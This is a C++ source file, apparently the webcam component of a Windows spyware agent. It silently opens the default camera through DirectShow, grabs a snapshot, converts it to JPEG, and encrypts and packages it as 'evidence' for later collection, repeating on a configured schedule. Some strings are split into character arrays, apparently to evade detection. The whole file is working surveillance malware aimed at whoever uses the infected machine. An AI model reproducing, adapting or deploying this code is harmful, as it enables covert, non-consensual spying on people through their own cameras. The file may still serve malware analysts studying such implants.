#include <Windows.h>
#include <dshow.h>
#include "utils.h"
#include "conf.h"
#include "proto.h"
#include "screenshot.h"
#include "zmem.h"
#include "globals.h"
#include "debug.h"

#pragma comment(lib, "strmiids")
#pragma include_alias( "dxtrans.h", "camera.h" )
#define __IDxtCompositor_INTERFACE_DEFINED__
#define __IDxtAlphaSetter_INTERFACE_DEFINED__
#define __IDxtJpeg_INTERFACE_DEFINED__
#define __IDxtKey_INTERFACE_DEFINED__
#include "camera.h"

CAMERA_LOGS lpCameraLogs[MAX_CAMERA_QUEUE];

BOOL QueueCameraLog(__in LPBYTE lpEvBuff, __in DWORD dwEvSize)
{
	if (!lpEvBuff || !dwEvSize)
		return FALSE;

	for (DWORD i=0; i<MAX_CAMERA_QUEUE; i++)
	{
		if (lpCameraLogs[i].dwSize == 0 || lpCameraLogs[i].lpBuffer == NULL)
		{
			lpCameraLogs[i].dwSize = dwEvSize;
			lpCameraLogs[i].lpBuffer = lpEvBuff;

			return TRUE;
		}
	}

	return FALSE;
}


VOID GetDefaultCapDevice(IBaseFilter **ppCap)
{
	HRESULT hr;
	ICreateDevEnum *pCreateDevEnum = NULL;
	IEnumMoniker *pEnum = NULL;

	do
	{
		*ppCap = NULL;
		hr = CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, IID_ICreateDevEnum, (LPVOID *)&pCreateDevEnum);
		if (FAILED(hr))
			break;

		hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
		if (hr != S_OK)
			break;

		pEnum->Reset();
		while (1)
		{
			IMoniker *pM = NULL;
			ULONG uFetched = 0;

			hr = pEnum->Next(1, &pM, &uFetched);
			if (hr != S_OK)
				break;

			hr = pM->BindToObject(0,0,IID_IBaseFilter, (void **)ppCap);
			if (pM)
			{
				pM->Release();
				pM = NULL;
			}
			if (*ppCap)
				break;
		}
	}
	while (0);

	if (pCreateDevEnum)
		pCreateDevEnum->Release();
	if (pEnum)
		pEnum->Release();
}

VOID FreeMediaType(AM_MEDIA_TYPE& mt)
{
    if (mt.cbFormat != 0) {
        CoTaskMemFree((PVOID)mt.pbFormat);
        mt.cbFormat = 0;
        mt.pbFormat = NULL;
    }
    if (mt.pUnk != NULL) {
        // pUnk should not be used.
        mt.pUnk->Release();
        mt.pUnk = NULL;
    }
}

VOID CameraGrab()
{
	HRESULT hr;
	AM_MEDIA_TYPE mt; 
	IGraphBuilder *pGraph = NULL;
	ICaptureGraphBuilder2 *pCaptureGraphBuilder = NULL;
	IMediaControl *pMediaControl = NULL;
	IMediaEventEx *pEvent = NULL;
	IBaseFilter *pVideoCapture = NULL;
	IBaseFilter	*pGrabberF = NULL;
	IBaseFilter	*pNullF = NULL;
	IEnumPins *pEnum = NULL;
	IPin *pPin = NULL;
	ISampleGrabber *pGrabber = NULL;
	LPBYTE lpBuffer = NULL;

#ifdef _DEBUG
	OutputDebug(L"[*] Starting camera grab\n");
#endif
	do
	{
		hr = CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (LPVOID *)&pGraph);
		if (FAILED(hr))
		{
#ifdef _DEBUG
			OutputDebug(L"[*] CLSID_FilterGraph\n");
#endif
			break;
		}

		hr = CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, (LPVOID *)&pCaptureGraphBuilder);
		if (FAILED(hr))
		{
#ifdef _DEBUG
			OutputDebug(L"[*] CLSID_CaptureGraphBuilder2\n");
#endif
			break;
		}

		hr = pCaptureGraphBuilder->SetFiltergraph(pGraph);
		if (FAILED(hr))
		{
#ifdef _DEBUG
			OutputDebug(L"[*] SetFiltergraph\n");
#endif
			break;
		}

		hr = pGraph->QueryInterface(IID_PPV_ARGS(&pMediaControl));
		if (FAILED(hr))
		{
#ifdef _DEBUG
			OutputDebug(L"[*] pMediaControl\n");
#endif
			break;
		}

		hr = pGraph->QueryInterface(IID_PPV_ARGS(&pEvent));
		if (FAILED(hr))
		{
#ifdef _DEBUG
			OutputDebug(L"[*] pEvent\n");
#endif
			break;
		}

		GetDefaultCapDevice(&pVideoCapture);
		if (!pVideoCapture)
		{
#ifdef _DEBUG
			OutputDebug(L"[!!] No Video deviceo\n");
#endif
			break;
		}

		hr = pVideoCapture->EnumPins(&pEnum);
		if (FAILED(hr))
		{
#ifdef _DEBUG
			OutputDebug(L"[!!] EnumPins\n");
#endif
			break;
		}

		while (pEnum->Next(1, &pPin, NULL) == S_OK)
		{
			PIN_DIRECTION pDir = (PIN_DIRECTION) 3;
			pPin->QueryDirection(&pDir);
			if (pDir != PINDIR_OUTPUT)
			{
				pPin->Release();
				pPin = NULL;
				continue;
			}
			break;
		}
		if (!pPin)
		{
#ifdef _DEBUG
			OutputDebug(L"[!!] pPin\n");
#endif
			break;
		}

		WCHAR strVideo[] = { L'V', L'i', L'd', L'e', L'o', L' ', L'C', L'a', L'p', L't', L'u', L'r', L'e', L' ', L'S', L'o', L'u', L'r', L'c', L'e', L'\0' };
		hr = pGraph->AddFilter(pVideoCapture, strVideo);
		if (FAILED(hr))
		{
#ifdef _DEBUG
			OutputDebug(L"[!!] AddFilter1\n");
#endif
			break;
		}

		hr = CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pGrabber));
		if (FAILED(hr))
		{
#ifdef _DEBUG
			OutputDebug(L"[!!] CLSID_SampleGrabber\n");
#endif
			break;
		}

		hr = pGrabber->QueryInterface(IID_PPV_ARGS(&pGrabberF));
		if (FAILED(hr))
		{
#ifdef _DEBUG
			OutputDebug(L"[!!] pGrabberF\n");
#endif
			break;
		}

		WCHAR strSampleG[] = { L'S', L'a', L'm', L'p', L'l', L'e', L' ', L'G', L'r', L'a', L'b', L'b', L'e', L'r', L'\0' };
		hr = pGraph->AddFilter(pGrabberF, strSampleG); // FIXME array
		if (FAILED(hr))
		{
#ifdef _DEBUG
			OutputDebug(L"[!!] AddFilter(pGrabberF\n");
#endif
			break;
		}

		SecureZeroMemory(&mt, sizeof(AM_MEDIA_TYPE));
		mt.majortype = MEDIATYPE_Video;
		mt.subtype = MEDIASUBTYPE_RGB24;

		hr = pGrabber->SetMediaType(&mt);
		FreeMediaType(mt);
		if (FAILED(hr))
		{
#ifdef _DEBUG
			OutputDebug(L"[!!] SetMediaType\n");
#endif
			break;
		}

		hr = CoCreateInstance(CLSID_NullRenderer, NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pNullF));
		if (FAILED(hr))
		{
#ifdef _DEBUG
			OutputDebug(L"[!!] CLSID_NullRenderer\n");
#endif
			break;
		}

		hr = pGraph->AddFilter(pNullF, L"Null"); // FIXME array
		if (FAILED(hr))
		{
#ifdef _DEBUG
			OutputDebug(L"[!!] Null\n");
#endif
			break;
		}

		hr = pCaptureGraphBuilder->RenderStream(NULL, NULL, pPin, pGrabberF, pNullF);
		if (FAILED(hr))
		{
#ifdef _DEBUG
			OutputDebug(L"[!!] RenderStream\n");
#endif
			break;
		}

		hr = pGrabber->SetBufferSamples(TRUE);
		if (FAILED(hr))
		{
#ifdef _DEBUG
			OutputDebug(L"[!!] SetBufferSamples\n");
#endif
			break;
		}
		
		hr = pMediaControl->Run();
		if (FAILED(hr))
		{
#ifdef _DEBUG
			OutputDebug(L"[!!] Run\n");
#endif
			break;
		}

		long evCode;
		hr = pEvent->WaitForCompletion(1000, &evCode);
		Sleep(1000);
		hr = pMediaControl->Stop();
		if (FAILED(hr))
		{
#ifdef _DEBUG
			OutputDebug(L"[!!] Stop\n");
#endif
			break;
		}

		long cbBuffer;
		hr = pGrabber->GetCurrentBuffer(&cbBuffer, NULL);
		lpBuffer = (LPBYTE) CoTaskMemAlloc(cbBuffer);
		if (!lpBuffer)
		{
#ifdef _DEBUG
			OutputDebug(L"[!!] lpBuffer %x, evcode: %x\n", cbBuffer, evCode);
#endif
			break;
		}
		hr = pGrabber->GetCurrentBuffer(&cbBuffer, (long*)lpBuffer);
		if (FAILED(hr))
		{
#ifdef _DEBUG
			OutputDebug(L"[!!] GetCurrentBuffer\n");
#endif
			break;
		}
		
		hr = pGrabber->GetConnectedMediaType(&mt);
		if ((mt.formattype == FORMAT_VideoInfo) && (mt.cbFormat >= sizeof(VIDEOINFOHEADER)) && (mt.pbFormat != NULL)) 
		{
			VIDEOINFOHEADER *pVih = (VIDEOINFOHEADER*)mt.pbFormat;
			//WriteCamBitmap(&pVih->bmiHeader, mt.cbFormat - SIZE_PREHEADER, lpBuffer, cbBuffer, 50); // FIME quality
			DWORD dwShotSize;
			LPBYTE pShotBuffer = BmpToJpgLog(PM_WEBCAMAGENT, &pVih->bmiHeader, mt.cbFormat - SIZE_PREHEADER, lpBuffer, cbBuffer, 50, &dwShotSize);
			if (pShotBuffer)
			{
				DWORD dwEvSize;
				LPBYTE lpEvBuffer = PackEncryptEvidence(dwShotSize, pShotBuffer, PM_WEBCAMAGENT, NULL, 0, &dwEvSize);
				zfree(pShotBuffer);
				if (!QueueCameraLog(lpEvBuffer, dwEvSize))
					zfree(lpEvBuffer);
#ifdef _DEBUG
				else
					OutputDebug(L"[*] Camera snapshot taken\n");
#endif
			}

		}
		FreeMediaType(mt);
	} 
	while(0);

	if (lpBuffer)
		CoTaskMemFree(lpBuffer);
	if (pCaptureGraphBuilder)
		pCaptureGraphBuilder->Release();
	if (pGraph)
		pGraph->Release();
	if (pEnum)
		pEnum->Release();
	if (pPin)
		pPin->Release();
	if (pMediaControl)
		pMediaControl->Release();
	if (pVideoCapture)
		pVideoCapture->Release();
	if (pGrabberF)
		pGrabberF->Release();
	if (pGrabber)
		pGrabber->Release();
	if (pNullF)
		pNullF->Release();
	if (pEvent)
		pEvent->Release();
}


VOID CameraMain()
{
	CoInitialize(NULL);

	DWORD dwIter = ConfGetIter(L"camera"); // FIXME ARRAY
	while (dwIter--)
	{
		if (bCameraThread == FALSE)
		{
#ifdef _DEBUG
			OutputDebug(L"[*] CameraMain exiting\n");
#endif
			hScreenShotThread = NULL;
			return;
		}

		CameraGrab();
		MySleep(ConfGetRepeat(L"camera")); // FIXME CHAR ARRAY
	}
}
